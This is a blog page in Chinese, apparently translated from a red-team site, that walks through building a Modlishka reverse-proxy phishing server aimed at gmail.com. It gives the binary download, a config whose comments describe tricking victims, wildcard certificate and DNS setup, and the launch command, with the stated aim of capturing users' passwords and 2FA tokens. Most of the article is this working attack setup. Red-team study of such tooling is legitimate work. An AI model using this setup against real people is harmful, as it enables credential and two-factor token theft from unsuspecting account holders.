@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="wD6I1h8lGi">
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="通过Modlishka HTTP反向代理进行网络钓鱼这个实验展示了怎样建立一个HTTPModlishka反向代理，这个代理可以被用来进行网络钓鱼活动来获取用户密码和2FA tokens。Modlsshka使用这一切变为了可能，因为它处在了你模仿的想要攻击的网页和受害者之间，记录了所有流量/tokens/密码的传输。 建立让我们从建立一个数据海洋中的水滴开始，虽然小但是绰绰有余。  登陆后，安装证书">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过Modlishka HTTP反向代理进行网络钓鱼">
+<meta property="og:url" content="http://ama666.cn/2019/09/02/通过HTTP反向代理进行网络钓鱼/index.html">
+<meta property="og:site_name" content="ama666">
+<meta property="og:description" content="通过Modlishka HTTP反向代理进行网络钓鱼这个实验展示了怎样建立一个HTTPModlishka反向代理，这个代理可以被用来进行网络钓鱼活动来获取用户密码和2FA tokens。Modlsshka使用这一切变为了可能，因为它处在了你模仿的想要攻击的网页和受害者之间，记录了所有流量/tokens/密码的传输。 建立让我们从建立一个数据海洋中的水滴开始，虽然小但是绰绰有余。  登陆后，安装证书">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT3Wwfnnbn0J8xgzZ%2FAnnotation%202019-06-25%20214151.png?alt=media&token=b1fa7c3f-f4c5-404b-9342-8db92af453f0">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT9ga7bDsW9ghRRgY%2FAnnotation%202019-06-25%20214300.png?alt=media&token=42a4c407-1ba5-45ef-90e1-b65f97379636">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTFMH3mWerGfyOEOV%2FAnnotation%202019-06-25%20214425.png?alt=media&token=88207ce2-73be-4995-bf83-ccdebc499b0b">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTLunFfm_iKTxk2ex%2FAnnotation%202019-06-25%20214749.png?alt=media&token=45332bc7-e93e-4fad-a45e-53dabc5d63cf">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTP6nWIhABPjfkYqM%2FAnnotation%202019-06-25%20214849.png?alt=media&token=72548338-2fb0-43a3-b08b-ecafe031ff32">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTZBUf3IYKGYnw8A-%2FAnnotation%202019-06-25%20214924.png?alt=media&token=1fca766c-5d80-479a-808d-2844a0b96461">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTg4wQyv650OJ3iDA%2FAnnotation%202019-06-25%20215107.png?alt=media&token=50e5cf73-0abc-4288-bd25-6d77c18511a2">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTkpsH6Ip5K0TvQIt%2FAnnotation%202019-06-25%20215155.png?alt=media&token=ee1333c4-e0ba-40d1-b4a1-b843ddb18b7a">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTp-GjlgmdT-c-g4T%2FAnnotation%202019-06-25%20215308.png?alt=media&token=33ba2e05-a684-4d78-b750-d3fa8326c68a">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTu8I9q-pAD0c5HDZ%2FAnnotation%202019-06-25%20215702.png?alt=media&token=b739db5f-3dce-4ce1-836c-faf61f35100e">
+<meta property="og:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFU2dkA0CS1OQJS4J5%2Fmodlishka.gif?alt=media&token=56f21a0e-a915-4478-9f7b-1503214d7882">
+<meta property="og:updated_time" content="2019-09-02T23:25:18.726Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过Modlishka HTTP反向代理进行网络钓鱼">
+<meta name="twitter:description" content="通过Modlishka HTTP反向代理进行网络钓鱼这个实验展示了怎样建立一个HTTPModlishka反向代理，这个代理可以被用来进行网络钓鱼活动来获取用户密码和2FA tokens。Modlsshka使用这一切变为了可能，因为它处在了你模仿的想要攻击的网页和受害者之间，记录了所有流量/tokens/密码的传输。 建立让我们从建立一个数据海洋中的水滴开始，虽然小但是绰绰有余。  登陆后，安装证书">
+<meta name="twitter:image" content="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT3Wwfnnbn0J8xgzZ%2FAnnotation%202019-06-25%20214151.png?alt=media&token=b1fa7c3f-f4c5-404b-9342-8db92af453f0">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://ama666.cn/2019/09/02/通过HTTP反向代理进行网络钓鱼/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>通过Modlishka HTTP反向代理进行网络钓鱼 | ama666</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ama666</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">平时多喝点茶</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2019/09/02/通过HTTP反向代理进行网络钓鱼/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安大侠">
+      <meta itemprop="description" content="每天挣扎的活着">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ama666">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">通过Modlishka HTTP反向代理进行网络钓鱼
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-02 18:08:27" itemprop="dateCreated datePublished" datetime="2019-09-02T18:08:27+08:00">2019-09-02</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-03 07:25:18" itemprop="dateModified" datetime="2019-09-03T07:25:18+08:00">2019-09-03</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="通过Modlishka-HTTP反向代理进行网络钓鱼"><a href="#通过Modlishka-HTTP反向代理进行网络钓鱼" class="headerlink" title="通过Modlishka HTTP反向代理进行网络钓鱼"></a>通过Modlishka HTTP反向代理进行网络钓鱼</h2><p>这个实验展示了怎样建立一个HTTP<code>Modlishka</code>反向代理，这个代理可以被用来进行网络钓鱼活动来获取用户密码和2FA tokens。Modlsshka使用这一切变为了可能，因为它处在了你模仿的想要攻击的网页和受害者之间，记录了所有流量/tokens/密码的传输。</p>
+<h3 id="建立"><a href="#建立" class="headerlink" title="建立"></a>建立</h3><p>让我们从建立一个数据海洋中的水滴开始，虽然小但是绰绰有余。</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT3Wwfnnbn0J8xgzZ%2FAnnotation%202019-06-25%20214151.png?alt=media&token=b1fa7c3f-f4c5-404b-9342-8db92af453f0" alt></p>
+<p>登陆后，安装证书机器人并下载modlsshka二进制。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install certbot</span><br><span class="line">wget https://github.com/drk1wi/Modlishka/releases/download/v.1.1.0/Modlishka-linux-amd64</span><br><span class="line">chmod +x Modlishka-linux-amd64 ; ls -lah</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFT9ga7bDsW9ghRRgY%2FAnnotation%202019-06-25%20214300.png?alt=media&token=42a4c407-1ba5-45ef-90e1-b65f97379636" alt></p>
+<h3 id="配置Modlishka"><a href="#配置Modlishka" class="headerlink" title="配置Modlishka"></a>配置Modlishka</h3><p>让我们为modlishka创建一个配置文件</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTFMH3mWerGfyOEOV%2FAnnotation%202019-06-25%20214425.png?alt=media&token=88207ce2-73be-4995-bf83-ccdebc499b0b" alt></p>
+<p>文件内容</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  //domain that you will be tricking your victim of visiting</span><br><span class="line">  "proxyDomain": "redteam.me",</span><br><span class="line">  "listeningAddress": "0.0.0.0",</span><br><span class="line"></span><br><span class="line">  //domain that you want your victim to think they are visiting</span><br><span class="line">  "target": "gmail.com",</span><br><span class="line">  "targetResources": "",</span><br><span class="line">  "targetRules":         "PC9oZWFkPg==:",</span><br><span class="line">  "terminateTriggers": "",</span><br><span class="line">  "terminateRedirectUrl": "",</span><br><span class="line">  "trackingCookie": "id",</span><br><span class="line">  "trackingParam": "id",</span><br><span class="line">  "jsRules":"",</span><br><span class="line">  "forceHTTPS": false,</span><br><span class="line">  "forceHTTP": false,</span><br><span class="line">  "dynamicMode": false,</span><br><span class="line">  "debug": true,</span><br><span class="line">  "logPostOnly": false,</span><br><span class="line">  "disableSecurity": false,</span><br><span class="line">  "log": "requests.log",</span><br><span class="line">  "plugins": "all",</span><br><span class="line">  "cert": "",</span><br><span class="line">  "certKey": "",</span><br><span class="line">  "certPool": ""</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="通配符证书"><a href="#通配符证书" class="headerlink" title="通配符证书"></a>通配符证书</h3><p>很重要 - 让我们为自己的域生成一个通配符证书，我希望我网络钓鱼的目标受害者登陆<code>*.redteam.me</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.redteam.me --email noreply@live.com</span><br></pre></td></tr></table></figure>
+
+<p>这将产生一个如下的质询代码</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTLunFfm_iKTxk2ex%2FAnnotation%202019-06-25%20214749.png?alt=media&token=45332bc7-e93e-4fad-a45e-53dabc5d63cf" alt></p>
+<p>我们需要在DNS管理控制台为我们的域名<code>redteam.me</code>创建一个DNS TXT记录，在本次试验中是Digital Ocean</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTP6nWIhABPjfkYqM%2FAnnotation%202019-06-25%20214849.png?alt=media&token=72548338-2fb0-43a3-b08b-ecafe031ff32" alt></p>
+<p>创建DNS TXT记录之后，继续生成我们的证书</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTZBUf3IYKGYnw8A-%2FAnnotation%202019-06-25%20214924.png?alt=media&token=1fca766c-5d80-479a-808d-2844a0b96461" alt></p>
+<p>证书生成完成之后，我们需要将他们转换为适合嵌入在JSON对象的格式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;printf "%s\\n", $0&#125;' /etc/letsencrypt/live/redteam.me/fullchain.pem</span><br><span class="line">awk '&#123;printf "%s\\n", $0&#125;' /etc/letsencrypt/live/redteam.me/privkey.pem</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTg4wQyv650OJ3iDA%2FAnnotation%202019-06-25%20215107.png?alt=media&token=50e5cf73-0abc-4288-bd25-6d77c18511a2" alt></p>
+<p>这步完成之后，将证书内容复制到配置文件 - <code>fullchain.pem</code>内容复制到<code>cert</code>；<code>privkey.pem</code>内容复制到<code>certKey</code></p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTkpsH6Ip5K0TvQIt%2FAnnotation%202019-06-25%20215155.png?alt=media&token=ee1333c4-e0ba-40d1-b4a1-b843ddb18b7a" alt></p>
+<h3 id="更多的DNS记录"><a href="#更多的DNS记录" class="headerlink" title="更多的DNS记录"></a>更多的DNS记录</h3><p>让我们为了根主机<code>@</code>构造一个A记录，只需指向服务器IP</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTp-GjlgmdT-c-g4T%2FAnnotation%202019-06-25%20215308.png?alt=media&token=33ba2e05-a684-4d78-b750-d3fa8326c68a" alt></p>
+<p>这一部非常重要 - 我们需要一个<code>CNAME</code>记录，任何一个字域名<code>*</code>指向<code>@</code></p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFTu8I9q-pAD0c5HDZ%2FAnnotation%202019-06-25%20215702.png?alt=media&token=b739db5f-3dce-4ce1-836c-faf61f35100e" alt></p>
+<h3 id="启动Modlishka"><a href="#启动Modlishka" class="headerlink" title="启动Modlishka"></a>启动Modlishka</h3><p>我们已经准备好了通过启动modlishka并给它modlishka.json配置文件来测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Modlishka-linux-amd64 -config modlishka.json</span><br></pre></td></tr></table></figure>
+
+<p>下面展示了如何访问 redteam.me，我收到了gmail.com的内容 - 表明Modlishka和反向代理成功工作。再次强调（我们没有创造目标网站的任何副本或者模板）受害者实际是在浏览gmail，它只是通过Modlishka提供服务，在那里检查流量并捕获密码。</p>
+<p><img src="https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LiFMettRbOEeU1PNch4%2F-LiFU2dkA0CS1OQJS4J5%2Fmodlishka.gif?alt=media&token=56f21a0e-a915-4478-9f7b-1503214d7882" alt></p>
+<p>本文翻译自<a href="https://ired.team/offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing#wildcard-certificates" target="_blank" rel="noopener">https://ired.team/offensive-security/red-team-infrastructure/how-to-setup-modliska-reverse-http-proxy-for-phishing#wildcard-certificates</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2019/09/02/通过HTTP反向代理进行网络钓鱼/" title="通过Modlishka HTTP反向代理进行网络钓鱼">http://ama666.cn/2019/09/02/通过HTTP反向代理进行网络钓鱼/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/29/SMTP中继-转发/" rel="next" title="SMTP中继/转发">
+                <i class="fa fa-chevron-left"></i> SMTP中继/转发
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/02/Empirecms7.5 Audit/" rel="prev" title="Empirecms7.5 Audit">
+                Empirecms7.5 Audit <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#通过Modlishka-HTTP反向代理进行网络钓鱼"><span class="nav-number">1.</span> <span class="nav-text">通过Modlishka HTTP反向代理进行网络钓鱼</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#建立"><span class="nav-number">1.1.</span> <span class="nav-text">建立</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置Modlishka"><span class="nav-number">1.2.</span> <span class="nav-text">配置Modlishka</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通配符证书"><span class="nav-number">1.3.</span> <span class="nav-text">通配符证书</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#更多的DNS记录"><span class="nav-number">1.4.</span> <span class="nav-text">更多的DNS记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动Modlishka"><span class="nav-number">1.5.</span> <span class="nav-text">启动Modlishka</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
